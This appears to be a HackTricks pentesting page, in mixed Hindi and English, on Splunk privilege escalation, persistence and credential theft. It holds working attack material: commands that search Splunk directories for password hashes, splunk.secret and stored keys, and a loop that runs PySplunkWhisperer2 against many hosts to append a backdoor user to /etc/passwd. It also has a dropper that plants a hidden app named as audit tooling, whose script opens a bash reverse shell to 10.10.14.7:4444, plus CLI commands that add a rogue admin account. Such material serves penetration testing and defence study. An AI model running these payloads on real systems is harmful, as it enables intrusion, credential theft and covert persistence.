# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

अगर आप **internally** या **externally** किसी machine का **enumerating** कर रहे हैं और आपको **Splunk running** मिलता है (आमतौर पर web UI के लिए **8000** और management API के लिए **8089**), तो valid credentials को अक्सर app installation, scripted inputs, या management actions के जरिए **code execution** में बदला जा सकता है। अगर Splunk **root** के रूप में चल रहा है, तो यह अक्सर तुरंत **privilege escalation** बन जाता है।

अगर आपको सिर्फ generic remote attack surface, enumeration, या app-upload RCE path चाहिए, तो देखें:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

अगर आप पहले से ही **root** हैं और Splunk service सिर्फ localhost पर listening नहीं है, तो आप **Splunk password hashes** भी चुरा सकते हैं, **encrypted secrets** recover कर सकते हैं, या local रूप से या multiple forwarders पर persistence बनाए रखने के लिए एक **malicious app** push कर सकते हैं।

## Interesting Local Files

जब आप Splunk या Splunk Universal Forwarder चल रहे किसी host पर पहुँचते हैं, तो ये आमतौर पर सबसे interesting paths होते हैं:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
महत्वपूर्ण artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users और password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key जिसका उपयोग Splunk कई `.conf` files में stored secrets को encrypt करने के लिए करता है।
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file; gold images और provisioning mistakes में useful. यदि `etc/passwd` पहले से मौजूद हो, तो इसे ignore किया जाता है.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: जहाँ scripted inputs आमतौर पर enabled होते हैं।
- **`$SPLUNK_HOME/etc/deployment-apps/`** या **`$SPLUNK_HOME/etc/apps/`**: persistent app छिपाने या पहले से क्या distribute हो रहा है, यह review करने के अच्छे स्थान।

## Splunk Universal Forwarder Agent Exploit Summary

अधिक विवरण के लिए [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) देखें। यह सिर्फ एक summary है:

**Exploit overview:**
Splunk Universal Forwarder (UF) को target करने वाला एक exploit attackers को **agent password** के साथ systems पर arbitrary code execute करने देता है जिन पर यह agent चल रहा है, जिससे environment का बड़ा हिस्सा potentially compromise हो सकता है।

**यह क्यों काम करता है:**

- UF management service अक्सर **TCP 8089** पर exposed होता है।
- Attackers API से authenticate करके forwarder को एक **malicious app bundle** install करने का निर्देश दे सकते हैं।
- यही primitive local रूप से **LPE** या remotely **RCE** के लिए इस्तेमाल किया जा सकता है।
- **SplunkWhisperer2** जैसे public tooling app bundle को automatically बनाते हैं और Linux targets के लिए payloads adapt कर सकते हैं।

**password recover करने के सामान्य तरीके:**

- documentation, scripts, shares, या deployment automation में cleartext credentials।
- `$SPLUNK_HOME/etc/passwd` के अंदर password hashes, फिर offline cracking।
- Golden images या provisioning leftovers जैसे `user-seed.conf`।

**Impact:**

- हर compromised host पर SYSTEM/root-level code execution।
- persistent apps, backdoors, या ransomware की deployment।
- data forwarded होने से पहले telemetry को disable करना या tamper करना।

**Exploitation के लिए example command:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Usable public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

अगर आपके पास `root`/`splunk` के रूप में **filesystem write access** है, या apps install करने की authenticated access है, तो एक बहुत reliable persistence mechanism है एक **custom app** के साथ **scripted input** drop करना। Splunk की अपनी documentation उम्मीद करती है कि scripted inputs app directory के अंदर रहें और `inputs.conf` से enabled हों।

Typical layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- वही trick **Universal Forwarder** पर `/opt/splunkforwarder/etc/apps/` का उपयोग करके भी काम करता है।
- Attackers अक्सर किसी स्पष्ट रूप से malicious app बनाने के बजाय एक legitimate add-on को modify करके blend in करते हैं।
- **deployment server** पर, `deployment-apps/` के अंदर एक malicious app plant करने से यह **fleet-wide persistence** बन जाता है क्योंकि forwarders poll करते हैं, updated apps download करते हैं, और अक्सर उन्हें apply करने के लिए restart करते हैं।

## Credential Theft and Admin Takeover

अगर आप Splunk की local files पढ़ सकते हैं, तो आमतौर पर दो अच्छे goals होते हैं: **Splunk admin access** recover करना और **encrypted service credentials** recover करना।

### Password hashes and local users

Splunk local authentication data को `etc/passwd` में store करता है। Deployment के अनुसार, उस file को crack करने से web UI और management API के लिए working credentials recover हो सकते हैं।

अगर आपके पास पहले से valid **admin** credentials हैं और Splunk अपना **native** authentication backend इस्तेमाल करता है, तो CLI itself persistence के लिए इस्तेमाल किया जा सकता है:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` और encrypted values

Splunk `etc/auth/splunk.secret` का उपयोग कई configuration files में stored sensitive values को protect करने के लिए करता है। अगर आप **secret** और संबंधित **`.conf` files** दोनों चुरा सकते हैं, तो आप अक्सर recover या replay कर सकते हैं:

- forwarder/indexer shared secrets जैसे `pass4SymmKey`
- TLS private-key passwords जैसे `sslPassword`
- LDAP bind credentials जैसे `bindDNPassword`

यह **lateral movement** के लिए उपयोगी है, भले ही Splunk admin password खुद crackable न हो।

### `user-seed.conf` abuse

`user-seed.conf` सिर्फ first start के दौरान या जब `etc/passwd` exist नहीं करता, तब consume होता है। इसलिए live box पर यह कम useful है, लेकिन इन मामलों में बहुत interesting है:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances जहाँ Splunk automatically reinitialized होता है

इन cases में, `splunk hash-passwd` से generated `HASHED_PASSWORD` plant करने से redeployment के बाद admin access वापस पाने का एक quiet तरीका मिल जाता है।

## Abusing Splunk Queries

Further details के लिए [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) देखें।

एक useful recent technique है vulnerable Splunk Enterprise versions में **user-supplied XSLT** को abuse करना, ताकि low-privileged authenticated account को `splunk` user के रूप में **OS command execution** में बदला जा सके।

High-level flow:

1. Splunk में authenticate करें।
2. preview/upload functionality के through एक malicious **XSL** file upload करें।
3. Splunk को **dispatch** directory से उस uploaded stylesheet के साथ search results render करने दें।
4. XSLT payload का उपयोग करके file लिखें या Splunk की search pipeline के through execution trigger करें (for example `runshellscript` जैसी internal functionality तक पहुँचकर)।

Important offensive takeaway यह है कि यह path **post-auth RCE** है, और इसमें app upload की जरूरत नहीं होती। Linux पर यह आमतौर पर आपको **`splunk`** account में पहुंचा देता है, जो फिर भी valuable है क्योंकि वह user अक्सर application tree का owner होता है, secrets पढ़ सकता है, और persistent apps plant कर सकता है जो shell loss के बाद भी survive करती हैं।

Exploitation के दौरान इस्तेमाल किया गया एक representative path है:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
यदि Splunk बहुत अधिक privileges के साथ चल रहा है, या यदि `splunk` user को dangerous scripts, writable service units, या खराब `sudo` rules तक access है, तो यह एक साफ **LPE** chain बन जाता है।

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
